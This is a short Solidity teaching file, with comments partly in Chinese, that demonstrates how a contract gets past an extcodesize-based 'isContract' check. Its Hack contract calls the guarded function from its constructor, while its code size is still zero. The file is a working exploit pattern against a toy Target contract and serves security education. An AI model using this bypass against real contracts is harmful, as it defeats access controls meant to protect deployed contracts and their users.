// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title 绕过合约规模检查
 * @dev   漏洞
    如果一个地址是合约地址，那么储存在该地址的代码大小将大于0
    让我们看看如果创建一个代码大小返回等于0的合约 extcodesize = 0
 */
contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FaildedAttack {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract

    function pwn(address _target) external {
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }

}